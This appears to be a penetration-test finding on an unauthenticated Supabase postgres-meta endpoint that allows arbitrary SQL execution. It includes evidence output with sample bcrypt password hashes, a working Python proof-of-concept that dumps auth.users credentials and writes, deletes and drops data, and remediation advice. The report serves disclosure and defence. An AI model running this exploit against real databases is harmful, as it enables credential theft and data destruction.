# Unauthenticated arbitrary SQL execution and database control via exposed postgres-meta API

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-08-26 07:39:14 UTC
**Target:** http://host.docker.internal:15421
**Endpoint:** /pg/query
**Method:** POST
**CWE:** CWE-306
**CVSS:** 9.8
**Fix Effort:** Low

## Description

The Supabase postgres-meta service is exposed at `/pg/*` on the public Kong gateway with no authentication. Any unauthenticated client can execute arbitrary SQL against the underlying PostgreSQL database via `POST /pg/query` (as the `postgres` role) and create/drop tables via `POST /pg/tables`. This yields full read and write access to all database data — including user PII and password hashes in `auth.users` — and completely bypasses the Row Level Security model that the application relies on. The REST API layer is correctly gated (all tables return HTTP 401 for anonymous users), which means the unauthenticated postgres-meta route nullifies the application's entire access-control design.

## Evidence

Unauthenticated POST `/pg/query` executes SQL as `postgres`:

```json
[{"current_user":"postgres","rolsuper":false}]
```

Unauthenticated read of credential material in `auth.users`:

```json
[{"email":"authtest_a@example.com","encrypted_password":"$2a$10$2/qP36/aNJycZ0DLmetVJu05cGQ0DJKqETSVogYhcwIs5TO4b3nla"},
 {"email":"userb_bola@test.com","encrypted_password":"$2a$10$2IStlbnDF1rfvYGFVJm8seSDa9ko5kGet/gxw3sve6trZ88LhOaru"}, ...]
```

Unauthenticated table creation via POST `/pg/tables`:

```json
{"id":19107,"schema":"public","name":"zz_pentest_marker","rls_enabled":false,...}
```

Unauthenticated full CRUD chain (insert tenant -> insert kategori -> read back -> delete both) all returned success with no auth header.

The intended access control rejects anonymous REST access:

```json
HTTP 401 {"code":"42501","details":null,"hint":"Grant the required privileges ...","message":"permission denied for table kategori"}
```

Row Level Security policies and all schema/roles/functions are also returned by `GET /pg/policies`, `GET /pg/roles` (including `supabase_admin` superuser and `service_role`), and `GET /pg/functions` (including the `pgbouncer.get_auth` SECURITY DEFINER function that returns role passwords).

## Impact

Unauthenticated, arbitrary SQL execution against the primary PostgreSQL database. Demonstrated actions include reading every table's data (including `auth.users` emails and bcrypt password hashes for all registered accounts), inserting new rows across tables (with foreign-key chains), deleting rows, dropping tables, and creating tables. Because the executing role has `can_bypass_rls`, the Row Level Security policies are completely ineffective against this channel. An attacker can exfiltrate all stored data, tamper with or destroy data, and escalate to creating roles/databases — a total compromise of the application's data plane.

## Technical Analysis

The Kong gateway routes `/pg/*` to the self-hosted `@supabase/postgres-meta` service without any authentication requirements. postgres-meta exposes management endpoints equivalent to the Supabase dashboard's schema editor: `GET /pg/roles`, `GET /pg/policies`, `GET /pg/functions`, `GET /pg/tables`, `GET /pg/columns`, etc. all return HTTP 200 anonymously. More critically, `POST /pg/query` accepts a `{"query": "..."}` body and executes it against the database under the `postgres` role, and `POST /pg/tables` accepts `{"name": "...", "schema": "..."}` and creates tables.

Validation confirmed:
- `POST /pg/query` with `{"query":"select current_user, (select rolsuper from pg_roles where rolname=current_user)"}` returned `[{"current_user":"postgres","rolsuper":false}]` — the query runs as `postgres`, which has `rolcreaterole`, `rolcreatedb`, and `can_bypass_rls` capabilities.
- The same endpoint returned all `auth.users` rows including `encrypted_password` bcrypt hashes.
- A full write chain was proven: `insert into public.tenant (nama, qr_code_value) values ('ZPENTEST_TENANT','ZPT')` succeeded, then `insert into public.kategori (tenant_id, nama)` referencing the new tenant succeeded, the rows were read back, and then deleted. `drop table public.zz_pentest_marker` (created via `POST /pg/tables`) also succeeded.
- Contrast: every `GET /rest/v1/<table>?select=*` returns HTTP 401 `42501 anon-permission-denied`, so the intended REST access control is sound — the postgres-meta route bypasses it entirely.
- The `postgres` role is not a database superuser and `pg_read_file` is denied, so direct host file read / classic RCE via file functions is not currently reachable; however, unrestricted data read/write/delete, password-hash disclosure, and table create/drop are all fully demonstrated, with a clear path to role/database creation as privilege escalation.

## Proof of Concept

1. Send an unauthenticated `POST` to `/pg/query` with body `{"query": "<sql>"}`. No cookie, JWT, or session is required.
2. To prove read access, execute `select email, encrypted_password from auth.users` and observe the returned user emails and bcrypt password hashes.
3. To prove write/delete access, execute an `insert` into a business table, then read it back, then `delete` it. (Creates and destroys rows without authentication.)
4. To prove schema control, `POST /pg/tables` with `{"name": "<marker>", "schema": "public"}` creates a table; `POST /pg/query` with `drop table ...` removes it.
5. Compare with the intended access control: an unauthenticated `GET /rest/v1/<table>?select=*` returns HTTP 401, confirming the REST/RLS model is bypassed by the `/pg/*` channel.

```python
import json
import urllib.request

BASE = "http://host.docker.internal:15421"
Q = BASE + "/pg/query"


def run(sql: str):
    body = json.dumps({"query": sql}).encode()
    req = urllib.request.Request(Q, data=body, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}: {e.read().decode()}"


# 1) Unauthenticated arbitrary query execution as `postgres`
print("identity   :", run("select current_user, session_user"))

# 2) Unauthenticated read of credential material (password hashes)
print("auth.users :", run("select email, encrypted_password from auth.users"))

# 3) Unauthenticated write + read + delete (full data chain)
print("insert t   :", run("insert into public.tenant (nama, qr_code_value) "
                          "values ('ZPENTEST_TENANT','ZPT') returning id"))
tid = run("select id from public.tenant where nama='ZPENTEST_TENANT'").split('"id":"')[1].split('"')[0]
print("insert k   :", run(f"insert into public.kategori (tenant_id, nama) "
                          f"values ('{tid}','ZPENTEST_KAT') returning id"))
print("select k   :", run("select nama from public.kategori where nama='ZPENTEST_KAT'"))
print("delete k   :", run("delete from public.kategori where nama='ZPENTEST_KAT'"))
print("delete t   :", run("delete from public.tenant where nama='ZPENTEST_TENANT'"))

# 4) Unauthenticated schema write (create + drop table)
T = BASE + "/pg/tables"
create = urllib.request.Request(
    T, data=json.dumps({"name": "zz_pentest_marker", "schema": "public"}).encode(),
    headers={"Content-Type": "application/json"})
print("create tbl :", urllib.request.urlopen(create).read().decode())
print("drop tbl   :", run("drop table public.zz_pentest_marker"))

# 5) Contrast: intended REST access control denies anonymous
req = urllib.request.Request(BASE + "/rest/v1/kategori?select=*")
try:
    urllib.request.urlopen(req)
except urllib.error.HTTPError as e:
    print("rest /kategori : HTTP", e.code, e.read().decode())
```

## Remediation

Remove the postgres-meta routes from the public origin entirely, since they are a management surface equivalent to the Supabase dashboard and must never be reachable over the internet. Configure the Kong gateway to deny external access to `/pg/*` (return 404 or 403 for all methods and all `/pg/*` paths), and only allow postgres-meta from the internal/trusted management network where schema-editing tooling legitimately calls it. As defense in depth, ensure the postgres-meta service itself requires an approved API token/role so that even an internal compromise cannot reach it, and verify no other service is behind an unauthenticated Kong route. After restricting the route, re-validate that `/pg/*` no longer responds anonymously and that `POST /pg/query` cannot be reached.

## Assumptions

No authentication or prior access is required; every request is anonymous. The finding is demonstrated on the target's primary PostgreSQL data store. The `postgres` role cannot read host files (directory/file read and classic RCE are not currently demonstrated), so availability/integrity/confidentiality are scored on the fully proven database read/write/delete/table lifecycle control and credential disclosure.
